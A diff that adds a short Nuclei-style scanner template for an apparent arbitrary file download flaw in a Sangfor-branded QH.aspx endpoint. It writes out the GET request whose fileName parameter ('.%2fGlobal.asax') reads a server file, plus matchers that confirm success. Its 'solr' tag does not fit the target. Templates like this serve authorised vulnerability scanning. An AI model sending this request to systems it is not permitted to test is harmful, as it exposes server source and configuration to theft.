@@ -1,0 +1,22 @@
+id: sxf-filedownload
+
+info:
+  name: 深信服文件下载
+  author: Str1am
+  severity: high
+  tags: solr
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fGlobal.asax"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "QiHang.Media.Web.Global"
+        part: body
+        condition: and
